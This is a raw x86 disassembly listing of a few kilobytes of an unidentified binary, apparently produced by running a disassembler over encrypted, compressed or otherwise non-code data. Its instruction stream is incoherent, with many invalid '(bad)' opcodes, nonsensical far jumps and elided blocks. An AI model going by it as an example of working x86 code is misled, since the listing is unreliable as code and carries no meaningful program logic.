  426cc4:	dec    ecx
  426cc5:	or     BYTE PTR [esi+edx*4-0x16],dl
  426cc9:	data16 jge 0x426cfb
  426ccc:	(bad)  
  426ccd:	aas    
  426cce:	jmp    0x775f4bab
  426cd3:	push   0xffffff9f
  426cd5:	mov    esi,0x33b15593
  426cda:	nop
  426cdb:	sbb    ecx,edi
  426cdd:	inc    esi
  426cde:	adc    BYTE PTR [ebx],ah
  426ce0:	outs   dx,DWORD PTR ds:[esi]
  426ce1:	loope  0x426c71
  426ce3:	inc    esi
  426ce4:	or     ebp,DWORD PTR cs:[eax+ecx*8+0x4af395f7]
  426cec:	sbb    eax,0xd0d622c4
  426cf1:	xor    esp,ebx
  426cf3:	inc    ecx
  426cf4:	cs xor ecx,esp
  426cf7:	enter  0xbbae,0x47
  426cfb:	and    BYTE PTR [edx+edi*2-0xc],al
  426cff:	addr16 pop esi
  426d01:	(bad)  
  426d02:	rol    cl,1
  426d04:	add    cl,BYTE PTR [eax-0x7a2f3833]
  426d0a:	jmp    0x426ced
  426d0c:	rol    ecx,1
  426d0e:	clc    
  426d0f:	pop    ds
  426d10:	push   edi
  426d11:	stos   BYTE PTR es:[edi],al
  426d12:	lods   eax,DWORD PTR ds:[esi]
  426d13:	sbb    DWORD PTR [eax],ebp
  426d15:	mov    dh,0x94
  426d17:	push   ss
  426d18:	adc    al,BYTE PTR [ebp+eiz*1+0x6853af4c]
  426d1f:	dec    edi
  426d20:	mov    eax,ds:0xc8629fd2
  426d25:	or     edx,DWORD PTR [ebp+0x52]
  426d28:	shr    BYTE PTR [ebp+0x40c98e5],cl
  426d2e:	dec    eax
  426d2f:	xchg   edi,eax
  426d30:	mov    ss,WORD PTR [esi-0x2a]
  426d33:	int    0xe4
  426d35:	jge    0x426ccd
  426d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d38:	hlt    
  426d39:	test   eax,0x94368c5a
  426d3e:	xor    ecx,DWORD PTR [ecx+edi*2]
  426d41:	fmul   DWORD PTR [esi+0x544b6621]
  426d47:	mov    BYTE PTR [edx+0x24183b51],bl
  426d4d:	retf   0x2045
  426d50:	hlt    
  426d51:	cwde   
  426d52:	cmp    al,BYTE PTR [ebx+0x686b5de4]
  426d58:	outs   dx,BYTE PTR ds:[esi]
  426d59:	ja     0x426cec
  426d5b:	stc    
  426d5c:	cdq    
  426d5d:	or     BYTE PTR [edi+0x236db1ec],bl
  426d63:	jno    0x426d59
  426d65:	pop    ebp
  426d66:	inc    ecx
  426d67:	lds    eax,FWORD PTR [ebx+0x6734446b]
  426d6d:	je     0x426d00
  426d6f:	arpl   WORD PTR [edx-0x7f],sp
  426d72:	data16 sbb BYTE PTR [eax-0x10],0xd2
  426d77:	pop    ds
  426d78:	outs   dx,DWORD PTR cs:[esi]
  426d7a:	mov    DWORD PTR [ebp+0x674f2964],eax
  426d80:	pop    ebp
  426d81:	sbb    DWORD PTR [ebx+0x40],ecx
  426d84:	pop    ds
  426d85:	pop    esi
  426d86:	rol    BYTE PTR [edi-0x3cea74ba],1
  426d8c:	sub    BYTE PTR [esi-0x51],cl
  426d8f:	mov    bh,0x13
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xdc0c:0xc7c2ecf9
  426e01:	lock retf 0xcefe
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0x26000001
  426e0d:	cwde   
  426e0e:	mov    ch,0xe
  426e10:	jmp    0x3f2b4585
  426e15:	hlt    
  426e16:	mov    es:0x8b53a250,eax
  426e1c:	cmp    DWORD PTR [ecx+0x20],eax
  426e1f:	mov    al,ds:0xc1f8965a
  426e24:	sub    BYTE PTR [ebp-0x41c071d9],dh
  426e2a:	cmp    DWORD PTR [edi],ecx
  426e2c:	fsub   DWORD PTR [esi-0x53]
  426e2f:	pop    es
  426e30:	sub    ecx,DWORD PTR [eax-0x22a84ec4]
  426e36:	stos   BYTE PTR es:[edi],al
  426e37:	ins    BYTE PTR es:[edi],dx
  426e38:	push   ecx
  426e39:	dec    eax
  426e3a:	ins    DWORD PTR es:[edi],dx
  426e3b:	std    
  426e3c:	(bad)  
  426e3d:	jge    0x426e04
  426e3f:	add    DWORD PTR [eax],esi
  426e41:	or     esp,DWORD PTR [esi]
  426e43:	lds    esp,FWORD PTR [edx]
  426e45:	jns    0x426e48
  426e47:	push   esi
  426e48:	sbb    cl,bl
  426e4a:	sbb    bh,dh
  426e4c:	dec    eax
  426e4d:	pop    edx
  426e4e:	mov    dh,0xb7
  426e50:	ret    0x51a8
  426e53:	inc    esp
  426e54:	mov    eax,0x17db7401
  426e59:	cmp    ecx,esi
  426e5b:	sub    dl,BYTE PTR [eax+eax*1]
  426e5e:	and    dl,BYTE PTR [edx+0x66]
  426e61:	test   eax,0x2778a4df
  426e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e67:	xor    eax,0x53359510
  426e6c:	mov    bh,0xbc
  426e6e:	leave  
  426e6f:	xchg   edx,eax
  426e70:	aas    
  426e71:	cmp    eax,0x22c99b8
  426e76:	pop    ebp
  426e78:	lea    esp,[ecx+0x2bda6fb4]
  426e7e:	cmp    ch,BYTE PTR [ebp+0x6]
  426e81:	inc    eax
  426e82:	pop    ds
  426e83:	sbb    al,0xd4
  426e85:	fisttp QWORD PTR [edx-0x71]
  426e88:	mov    BYTE PTR [edx+esi*4+0x30e9718e],cl
  426e8f:	pop    eax
  426e90:	xchg   BYTE PTR [ebx-0x58],al
  426e93:	out    dx,eax
  426e94:	and    BYTE PTR [ebp+0x3dc05c2c],ah
  426e9a:	mov    ecx,0xe1f7d1
  426e9f:	sbb    DWORD PTR [eax],edx
  426ea1:	mov    DWORD PTR es:[esi],ebp
  426ea4:	inc    ebx
  426ea5:	adc    esi,DWORD PTR [ebp+0x5ddca546]
  426eab:	(bad)  
  426eac:	aam    0x83
  426eae:	jno    0x426eb8
  426eb0:	adc    edx,esi
  426eb2:	into   
  426eb3:	cli    
  426eb4:	jno    0x426e6b
  426eb6:	jge    0x426f06
  426eb8:	ret    0x8ade
  426ebb:	fs mov cs,ebx
  426ebe:	jecxz  0x426e50
  426ec0:	mov    ecx,0x29767397
  426ec5:	pop    DWORD PTR [edi]
  426ec7:	or     eax,0xade2326c
  426ecc:	lea    ebx,[edi+esi*1]
  426ecf:	adc    ch,BYTE PTR [ebx-0x2]
  426ed2:	ins    DWORD PTR es:[edi],dx
  426ed3:	iret   
  426ed4:	jp     0x426f13
  426ed6:	push   cs
  426ed7:	int    0x61
  426ed9:	inc    esp
  426eda:	aad    0xc6
  426edc:	jno    0x426e91
  426ede:	and    eax,0x6381fc12
  426ee3:	dec    ecx
  426ee4:	xor    dh,0x90
  426ee7:	test   BYTE PTR [edx],cl
  426ee9:	xchg   esp,eax
  426eea:	xchg   esi,eax
  426eeb:	xor    esi,ebp
  426eed:	test   eax,0x72dd3d52
  426ef2:	adc    cl,BYTE PTR [ecx]
  426ef4:	retf   0x597e
  426ef7:	adc    al,0xcc
  426ef9:	imul   DWORD PTR [eax-0x757a56a7]
  426eff:	imul   edi,DWORD PTR [esi+0x2349e565],0x209b436e
  426f09:	rcl    DWORD PTR [esi],0x3e
  426f0c:	ja     0x426ec6
  426f0e:	pop    esp
  426f0f:	wbinvd 
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [ebx+ebx*2-0x2cfafe32],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	mov    cl,0x21
  426f8e:	mov    edi,0xfeb3539f
  426f93:	out    dx,eax
  426f94:	(bad)  
  426f95:	sub    al,0x82
  426f97:	fmul   DWORD PTR [edi]
  426f99:	push   eax
  426f9a:	fwait
  426f9b:	jge    0x426f89
  426f9d:	and    eax,0x237b40a7
  426fa2:	js     0x426f7c
  426fa4:	mov    al,ds:0x1541fb84
  426fa9:	ficomp DWORD PTR [edi]
  426fab:	call   FWORD PTR [eax-0x2d]
  426fae:	sbb    al,0xa1
  426fb0:	fcmovne st,st(3)
  426fb2:	shl    BYTE PTR [esi-0x41],cl
  426fb5:	(bad)  
  426fb6:	jmp    0x426f4d
  426fb8:	lock xlat BYTE PTR ds:[ebx]
  426fba:	or     al,0xc3
  426fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fbd:	xchg   BYTE PTR [esi+0x35],al
  426fc0:	add    eax,0x7fd17b47
  426fc5:	mov    eax,DWORD PTR [ebp-0x6c8e6086]
  426fcb:	jnp    0x426fc7
  426fcd:	inc    ebx
  426fce:	cmp    edi,esi
  426fd0:	mov    dh,0x4
  426fd2:	sti    
  426fd3:	xor    BYTE PTR ds:0x35afe21e,bl
  426fd9:	hlt    
  426fda:	mov    edi,0xdb20186c
  426fdf:	cs out dx,al
  426fe1:	push   ds
  426fe2:	inc    ebp
  426fe3:	lods   eax,DWORD PTR ds:[esi]
  426fe4:	lods   eax,DWORD PTR ds:[esi]
  426fe5:	adc    eax,0x2ed8aa68
  426fea:	retf   
  426feb:	iret   
  426fec:	dec    eax
  426fed:	and    BYTE PTR [ebx+0x2f],bh
  426ff0:	pop    ebp
  426ff1:	pop    ebx
  426ff2:	popf   
  426ff3:	fs jns 0x426fc2
  426ff6:	inc    ecx
  426ff7:	jl     0x426f9e
  426ff9:	mov    ecx,0xd0c23524
  426ffe:	xchg   ebp,eax
  426fff:	aad    0x16
  427001:	push   ecx
  427002:	or     eax,0x5a7ffec2
  427007:	or     edi,edi
  427009:	push   es
  42700a:	push   ss
  42700b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42700c:	and    DWORD PTR [ebp+0x5b5cf8f2],ebx
  427012:	std    
  427013:	enter  0x8448,0x24
  427017:	xchg   ebx,eax
  427018:	mov    DWORD PTR [eax+0x48],ebx
  42701b:	jecxz  0x426ff8
  42701d:	call   FWORD PTR [ecx-0x53]
  427020:	add    dl,al
  427022:	icebp  
  427023:	or     DWORD PTR [esi+0x4ac91e41],0x7d
  42702a:	fwait
  42702b:	popf   
  42702c:	fisub  DWORD PTR [edi+0xeb0abdf]
  427032:	jmp    0x7b6f2e00
  427037:	xchg   esp,eax
  427038:	scas   al,BYTE PTR es:[edi]
  427039:	mov    ds:0xe22bf933,eax
  42703e:	sahf   
  42703f:	pop    si
  427041:	jno    0x427019
  427043:	sub    bh,BYTE PTR [edx-0xd]
  427046:	ins    DWORD PTR es:[edi],dx
  427047:	out    0x28,eax
  427049:	adc    eax,0xdf0f00e7
  42704f:	adc    eax,0x7d525e0
  427054:	fcomi  st,st(7)
  427056:	ret    0x10af
  427059:	ins    DWORD PTR es:[edi],dx
  42705a:	js     0x42701c
  42705c:	(bad)  
  42705d:	fst    QWORD PTR [edi+edx*4-0x41]
  427061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427062:	(bad)  
  427063:	pop    ebp
  427064:	or     dl,BYTE PTR [esi]
  427066:	xlat   BYTE PTR ds:[ebx]
  427067:	test   eax,0xa3b99d28
  42706c:	(bad)  
  42706d:	push   ss
  42706e:	(bad)  
  427070:	add    DWORD PTR [ebx],0x5c
  427073:	repnz and dh,BYTE PTR [esi]
  427076:	xor    DWORD PTR [ecx-0x57b24cb2],0xdfe7ccbf
  427080:	inc    edx
  427081:	xchg   BYTE PTR [ebx+0x6f],ch
  427084:	jmp    0x4270b3
  427086:	aam    0x33
  427088:	mov    edx,0xac5e6145
  42708d:	mov    bh,0x1c
  42708f:	or     al,0x9f
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xeb259d96
  427102:	imul   ecx,esi,0xffffffd8
  427105:	mov    eax,ds:0x1050001
  42710a:	add    BYTE PTR [eax],al
  42710c:	sub    ecx,DWORD PTR [ebp+0x2deb5a45]
  427112:	mov    esp,0xb2a06a46
  427117:	mov    cl,0xb0
  427119:	mov    ah,0x43
  42711b:	loopne 0x4270a0
  42711d:	(bad)  
  42711e:	aad    0xe4
  427120:	adc    eax,0xa4cef96
  427125:	daa    
  427126:	dec    ebx
  427127:	xchg   BYTE PTR [ebx],ch
  427129:	loopne 0x4270cd
  42712b:	ror    bh,1
  42712d:	mov    WORD PTR [edi+0x658a8d8e],ss
  427133:	mov    dl,0x89
  427135:	sub    eax,0xb257891d
  42713a:	push   ss
  42713b:	(bad)  
  42713d:	shl    ch,cl
  42713f:	mov    al,ds:0x5161c2f9
  427144:	push   cs
  427145:	loop   0x427130
  427147:	test   eax,0x80345e5e
  42714c:	fisttp WORD PTR [edi]
  42714e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42714f:	ins    BYTE PTR es:[edi],dx
  427150:	mov    edi,0x3ce8e3e9
  427155:	mov    ch,0xdb
  427157:	xor    DWORD PTR [eax+0x61c801b1],esp
  42715d:	rcl    dh,cl
  42715f:	mov    ebx,ebx
  427161:	xor    al,ch
  427163:	sbb    eax,0x3f3944a3
  427168:	pop    esp
  427169:	pop    edx
  42716a:	lods   eax,DWORD PTR ds:[esi]
  42716b:	(bad)
  42716e:	jmp    0x2534d727
  427173:	pop    ebp
  427174:	xchg   edx,eax
  427175:	mov    edi,esp
  427177:	fdivr  DWORD PTR [ebp+0x3e]
  42717a:	(bad)  [ebx-0x66]
  42717d:	jno    0x427181
  42717f:	jno    0x427191
  427181:	out    dx,eax
  427182:	mov    ecx,0x8ce714b0
  427187:	call   0x60d2:0xce05d539
  42718e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42718f:	fs sub eax,DWORD PTR gs:[edx-0x44]
  427194:	rcl    BYTE PTR [esi+ebp*4+0x46d60af0],0x75
  42719c:	rcl    BYTE PTR [eax-0x475b1290],cl
  4271a2:	int    0x1e
  4271a4:	stos   BYTE PTR es:[edi],al
  4271a5:	inc    ebp
  4271a6:	push   0x2e
  4271a8:	in     eax,0x27
  4271aa:	jae    0x4271a5
  4271ac:	sub    ebx,edx
  4271ae:	and    BYTE PTR [eax+0x4e127508],0x2d
  4271b5:	xor    eax,0xeba797c2
  4271ba:	xor    DWORD PTR [eax+0x6695167e],0xb
  4271c1:	inc    esi
  4271c2:	and    esi,DWORD PTR [ebx+0x20d05147]
  4271c8:	les    ebx,FWORD PTR [ebp-0x1f]
  4271cb:	neg    DWORD PTR [ecx-0x3f5f40e1]
  4271d1:	retf   
  4271d2:	sti    
  4271d3:	xor    al,0xf9
  4271d5:	pusha  
  4271d6:	inc    edx
  4271d7:	rol    DWORD PTR [eax-0x540c162d],1
  4271dd:	lea    ebp,[edx+eiz*1]
  4271e0:	popa   
  4271e1:	dec    eax
  4271e2:	std    
  4271e3:	iret   
  4271e4:	pop    esp
  4271e5:	add    eax,0x6673e4a
  4271ea:	jmp    0xd15c45db
  4271ef:	ja     0x427203
  4271f1:	jmp    0x42717a
  4271f3:	jno    0x427266
  4271f5:	jbe    0x427213
  4271f7:	je     0x4271c3
  4271f9:	push   ecx
  4271fa:	(bad)  
  4271fb:	or     eax,0x93436383
  427200:	rol    DWORD PTR [eax],1
  427202:	jnp    0x4271f0
  427204:	push   ebx
  427205:	pop    edi
  427206:	and    esp,DWORD PTR [eax+0x70cf3990]
  42720c:	call   0xe82bc984
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x518e08a7,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	fmul   DWORD PTR [esi]
  42728e:	sub    al,0xa
  427290:	mov    edi,0x4612deec
  427295:	mov    esp,DWORD PTR gs:0x9fc163d5
  42729c:	dec    ecx
  42729d:	hlt    
  42729e:	rcr    al,cl
  4272a0:	xchg   ebx,eax
  4272a1:	jo     0x4272b3
  4272a3:	push   es
  4272a4:	and    DWORD PTR [ecx-0x62d7b790],0x59154212
  4272ae:	add    bh,0xa5
  4272b1:	xor    al,0xf8
  4272b3:	(bad)  
  4272b4:	adc    esp,DWORD PTR [ebp+0x10]
  4272b7:	jp     0x42730c
  4272b9:	jge    0x427241
  4272bb:	repnz loop 0x4272d7
  4272be:	or     BYTE PTR [eax-0x666ad15e],dh
  4272c4:	inc    edi
  4272c5:	sbb    eax,edi
  4272c7:	add    esp,DWORD PTR [eax]
  4272c9:	fs ja  0x427320
  4272cc:	popa   
  4272cd:	nop
  4272ce:	pop    ds
  4272cf:	jae    0x427256
  4272d1:	test   eax,0x93a0d021
  4272d6:	push   ebx
  4272d7:	scas   al,BYTE PTR es:[edi]
  4272d8:	cdq    
  4272d9:	mov    esp,0x20f9aa11
  4272de:	lahf   
  4272df:	push   0xfffffff1
  4272e1:	jbe    0x4272d5
  4272e3:	sbb    DWORD PTR [eax],edx
  4272e5:	sbb    eax,0xae039f22
  4272ea:	mov    ?,WORD PTR [edx-0x35]
  4272ed:	xchg   BYTE PTR [ebp+0x47],dl
  4272f0:	pop    esp
  4272f1:	dec    edi
  4272f2:	sti    
  4272f3:	fbld   TBYTE PTR [esi-0x18ed6056]
  4272f9:	xchg   ebp,eax
  4272fa:	das    
  4272fb:	(bad)  
  4272fc:	int    0x22
  4272fe:	jbe    0x4272ec
  427300:	test   DWORD PTR [eax],ecx
  427302:	shr    BYTE PTR es:[eax-0x1e],cl
  427306:	mov    eax,0xe672ffd6
  42730b:	or     al,0x9d
  42730d:	std    
  42730e:	add    eax,0x9be2dc56
  427313:	fmul   st(1),st
  427315:	adc    ecx,esi
  427317:	(bad)  
  427318:	in     al,0xdc
  42731a:	bound  ebp,QWORD PTR [edx]
  42731c:	xor    eax,0xb23d34bc
  427321:	push   0x2d
  427323:	popf   
  427324:	fdiv   QWORD PTR ds:[ebp+0x0]
  427328:	mov    eax,ds:0x31b732e3
  42732d:	ret    0xb71d
  427330:	call   0x7926:0xc2482fb4
  427337:	mov    edx,0xefb887af
  42733c:	cmp    al,BYTE PTR [edi-0x6d]
  42733f:	lahf   
  427340:	leave  
  427341:	hlt    
  427342:	lds    esp,FWORD PTR [edx+0x35]
  427345:	push   ebp
  427346:	loopne 0x4272fc
  427348:	xor    edx,DWORD PTR [edi+ebx*2]
  42734b:	fwait
  42734c:	cwde   
  42734d:	and    al,0x67
  42734f:	xchg   esp,eax
  427350:	ja     0x4273b9
  427352:	jle    0x427352
  427354:	xchg   BYTE PTR [esp+edi*8-0x16],dl
  427358:	inc    edi
  427359:	inc    eax
  42735a:	lea    ebp,[esi-0x68]
  42735d:	mov    al,0x58
  42735f:	fidiv  DWORD PTR [edx+ebx*1+0x283557bc]
  427366:	daa    
  427367:	and    BYTE PTR [ecx-0x43],al
  42736a:	stos   DWORD PTR es:[edi],eax
  42736b:	sub    al,BYTE PTR [edx]
  42736d:	clc    
  42736e:	fs mov eax,0xe89520e8
  427374:	(bad)  
  427377:	je     0x4273c4
  427379:	and    BYTE PTR ds:0x92f3e030,0x91
  427380:	test   al,0x46
  427382:	xchg   esp,eax
  427383:	inc    ebx
  427384:	push   eax
  427385:	dec    edi
  427386:	loop   0x427323
  427388:	sub    ch,ah
  42738a:	in     eax,0xc7
  42738c:	retf   0x8ea4
  42738f:	in     eax,dx
  427390:	pop    eax
	...
  4273f1:	add    BYTE PTR [eax],al
  4273f3:	add    BYTE PTR [edx],dl
  4273f5:	sbb    eax,0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    eax,DWORD PTR [edi+0x2c]
  427402:	push   0x44
  427404:	loop   0x4273a9
  427406:	add    DWORD PTR [eax],eax
  427408:	add    eax,0xd7000001
  42740d:	imul   esp,DWORD PTR [esp+esi*4],0xffffff89
  427411:	lahf   
  427412:	inc    edx
  427413:	push   0xffffffb0
  427415:	mov    dl,al
  427417:	into   
  427418:	out    0x8e,eax
  42741a:	daa    
  42741b:	and    BYTE PTR [esi+0x7e61bafc],bh
  427421:	aad    0xae
  427423:	push   0xa1710f63
  427428:	push   0xffffffb0
  42742a:	in     eax,0x70
  42742c:	pop    ds
  42742d:	pop    eax
  42742e:	repz pop ebp
  427430:	dec    esi
  427431:	cmp    dh,BYTE PTR [eax+0x4e13627f]
  427437:	pop    ebp
  427438:	daa    
  427439:	push   ebp
  42743a:	gs and ch,ah
  42743d:	test   eax,0xb91856ab
  427442:	call   DWORD PTR [ebx]
  427444:	int3   
  427445:	adc    BYTE PTR [eax],dh
  427447:	repz xor esi,DWORD PTR [eax]
  42744a:	sbb    DWORD PTR [ecx-0x15],eax
  42744d:	jns    0x4273e3
  42744f:	fcom   DWORD PTR [edi-0x64]
  427452:	sahf   
  427453:	(bad)  
  427454:	fldcw  WORD PTR [ebx+0x677858]
  42745a:	repnz fiadd WORD PTR [ebx+0x444c442a]
  427461:	add    al,0x8d
  427463:	hlt    
  427464:	sbb    eax,0xca3e987d
  427469:	loope  0x427446
  42746b:	mov    ebx,DWORD PTR [esi]
  42746d:	xchg   ecx,eax
  42746e:	mov    ah,0xf5
  427470:	dec    ebx
  427471:	mov    al,ds:0x68422b7e
  427476:	mov    bh,0x50
  427478:	dec    edx
  427479:	mov    ah,0xfb
  42747b:	push   ds
  42747c:	loop   0x427429
  42747e:	xchg   BYTE PTR [edx+0x67b07d0c],bl
  427484:	outs   dx,BYTE PTR ds:[esi]
  427485:	or     edx,DWORD PTR [esp+ebp*8]
  427488:	(bad)  
  42748a:	mov    dl,0xa3
  42748c:	jp     0x427421
  42748e:	adc    eax,0x45123720
  427493:	fwait
  427494:	in     al,dx
  427495:	popf   
  427496:	pop    edi
  427497:	push   eax
  427498:	fdivr  DWORD PTR [ecx]
  42749a:	mov    ebp,0xcf4e07f3
  42749f:	mov    bl,0xf
  4274a1:	imul   ebx,DWORD PTR [eax-0x7e33d8b2],0xffffff9d
  4274a8:	pop    esp
  4274a9:	push   ebp
  4274aa:	lods   eax,DWORD PTR ds:[esi]
  4274ab:	(bad)  
  4274ac:	sub    BYTE PTR [edi],dh
  4274ae:	out    dx,eax
  4274af:	mov    BYTE PTR [edi],0xed
  4274b2:	(bad)  
  4274b3:	js     0x42750e
  4274b5:	jmp    0xa2de5a05
  4274ba:	adc    esp,eax
  4274bc:	sub    eax,0x41f94972
  4274c1:	inc    edi
  4274c2:	adc    BYTE PTR [edx+esi*8],ch
  4274c5:	(bad)  
  4274c6:	(bad)  
  4274c7:	js     0x4274a2
  4274c9:	clc    
  4274ca:	cmp    DWORD PTR [ecx+edx*1],edi
  4274cd:	mov    bl,ah
  4274cf:	xchg   ebp,eax
  4274d0:	add    edi,DWORD PTR [edi+ebx*2+0x4f073f52]
  4274d7:	pop    ecx
  4274d8:	push   0x30
  4274da:	pop    es
  4274db:	daa    
  4274dc:	call   0x1e45:0xf8e37a2c
  4274e3:	xor    bl,BYTE PTR [edx+esi*2-0x54]
  4274e7:	and    ebx,ebx
  4274e9:	jmp    0xbed7:0xb28a343d
  4274f0:	pop    edi
  4274f1:	aas    
  4274f2:	(bad)  
  4274f3:	repnz mov gs,esi
  4274f6:	aas    
  4274f7:	pop    ss
  4274f8:	adc    eax,0x941976ed
  4274fd:	sbb    dh,BYTE PTR [ecx+0x53]
  427500:	test   DWORD PTR [esi-0x21],ebx
  427503:	push   ebx
  427504:	aaa    
  427505:	shl    DWORD PTR [edx],cl
  427507:	xor    BYTE PTR [ebp-0x7b],cl
  42750a:	push   edx
  42750b:	ret    0xe965
  42750e:	push   ebx
  42750f:	push   ds
  427510:	jnp    0x427512
	...
  427572:	add    BYTE PTR [eax],al
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	shl    DWORD PTR [esi],cl
  427582:	adc    eax,0x1a4e71c
  427587:	add    BYTE PTR ds:0x90000001,al
  42758d:	pcmpeqw mm3,QWORD PTR [edi]
  427590:	push   eax
  427591:	in     eax,dx
  427592:	(bad)
  427595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427596:	sbb    al,0xbb
  427598:	in     eax,dx
  427599:	out    0x25,eax
  42759b:	jb     0x42754c
  42759d:	dec    eax
  42759e:	adc    edi,esi
  4275a0:	popf   
  4275a1:	push   esi
  4275a2:	repz sbb al,0xce
  4275a5:	fild   DWORD PTR [eax-0x54657e18]
  4275ab:	stos   DWORD PTR es:[edi],eax
  4275ac:	stos   DWORD PTR es:[edi],eax
  4275ad:	sub    eax,0xcffd51c5
  4275b2:	dec    ebx
  4275b3:	gs aas 
  4275b5:	in     eax,0x6f
  4275b7:	add    dl,BYTE PTR [esi]
  4275b9:	shr    BYTE PTR [ecx+0x31],0xbf
  4275bd:	xlat   BYTE PTR ds:[ebx]
  4275be:	inc    esp
  4275c0:	icebp  
  4275c1:	push   ebp
  4275c2:	into   
  4275c3:	ds inc eax
  4275c5:	ja     0x42762a
  4275c7:	xchg   ebp,eax
  4275c8:	mov    bh,0x95
  4275ca:	mov    ds:0x55a1e1c6,eax
  4275cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275d0:	mul    DWORD PTR [ecx+0xd]
  4275d3:	mov    eax,ds:0xf084e4f4
  4275d8:	test   al,0x49
  4275da:	aam    0x2c
  4275dc:	repnz inc eax
  4275de:	sub    eax,esp
  4275e0:	std    
  4275e1:	and    ecx,ebp
  4275e3:	xor    edx,DWORD PTR [edi]
  4275e5:	jnp    0x427662
  4275e7:	adc    BYTE PTR [esi+0x37b06667],0xeb
  4275ee:	add    al,0xb0
  4275f0:	xor    BYTE PTR [edx],0xf6
  4275f3:	inc    edi
  4275f4:	sub    edi,edx
  4275f6:	call   0x26518c71
  4275fb:	icebp  
  4275fc:	shl    DWORD PTR ds:0x7ee5fb85,cl
  427602:	(bad)  
  427603:	adc    BYTE PTR es:[edx-0x41],ah
  427607:	cdq    
  427608:	(bad)  
  427609:	into   
  42760a:	outs   dx,DWORD PTR ds:[esi]
  42760b:	loope  0x4275b1
  42760d:	out    dx,al
  42760e:	shr    DWORD PTR [ebx+edx*2-0x7809cf5b],0x55
  427616:	inc    esi
  427617:	repz push ebx
  427619:	mov    al,0x14
  42761b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42761d:	fmul   QWORD PTR [edx-0x5a]
  427620:	or     BYTE PTR [eax-0x24c1473f],al
  427626:	xchg   ebx,eax
  427627:	nop
  427628:	out    dx,eax
  427629:	loopne 0x427635
  42762b:	repz jmp 0x427652
  42762e:	and    eax,0x444f8967
  427633:	pop    edx
  427634:	cwde   
  427635:	dec    esp
  427636:	add    BYTE PTR [ebx+0x3940b2ea],0xa6
  42763d:	cmp    eax,0x60e480aa
  427642:	aaa    
  427643:	stc    
  427644:	sbb    esp,DWORD PTR [edx+0x15]
  427647:	xor    BYTE PTR [edx+0x4ec29171],0x27
  42764e:	cld    
  42764f:	aas    
  427650:	mov    bl,BYTE PTR [ebx+eiz*4+0x38fbe915]
  427657:	sub    BYTE PTR [ecx-0x5a],0x36
  42765b:	fs push 0x50
  42765e:	popa   
  42765f:	pop    edi
  427660:	ret    0x219e
  427663:	cwde   
  427664:	xchg   esp,eax
  427665:	cmp    eax,0xee89aaa4
  42766a:	repnz into 
  42766c:	sub    DWORD PTR [edi],edi
  42766e:	ret    
  42766f:	jecxz  0x42769d
  427671:	adc    BYTE PTR [ebx+eax*4+0x53],al
  427675:	xchg   edx,eax
  427676:	retf   
  427677:	out    dx,eax
  427678:	mov    dl,0xc3
  42767a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42767c:	adc    eax,edi
  42767e:	ret    0x151a
  427681:	pop    ds
  427682:	or     edx,DWORD PTR [edi]
  427684:	xor    BYTE PTR [edi],0xf2
  427687:	cld    
  427688:	test   BYTE PTR [esp+edx*8],0x3
  42768c:	mov    dh,0x2e
  42768e:	mov    dh,0xa2
  427690:	push   edx
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fnstenv [esp+edx*1]
  427702:	mov    edi,0x1a5ec09
  427707:	add    BYTE PTR ds:0x30000001,al
  42770d:	jmp    0x7ede:0xbb4da907
  427714:	stc    
  427715:	pop    edi
  427716:	aad    0x98
  427718:	mov    ah,0x5f
  42771a:	mov    bh,0xda
  42771c:	mov    DWORD PTR [edi+ebp*4+0x4a],eax
  427720:	repz loop 0x42774f
  427723:	or     ecx,DWORD PTR [eax+ebp*4+0x58]
  427727:	das    
  427728:	sbb    DWORD PTR [ebx+0x36],0x6d
  42772c:	leave  
  42772d:	test   BYTE PTR ss:[edi+esi*2+0x44],al
  427732:	dec    esp
  427733:	sbb    BYTE PTR [ecx],dh
  427735:	stc    
  427736:	dec    ebp
  427737:	cmp    DWORD PTR [ebx-0x4f525bcf],ebx
  42773d:	jmp    0x926ff264
  427742:	aas    
  427743:	lock (bad) 
  427745:	out    0x81,eax
  427747:	mov    eax,0x845e02f8
  42774c:	std    
  42774d:	inc    ebx
  42774e:	repnz popf 
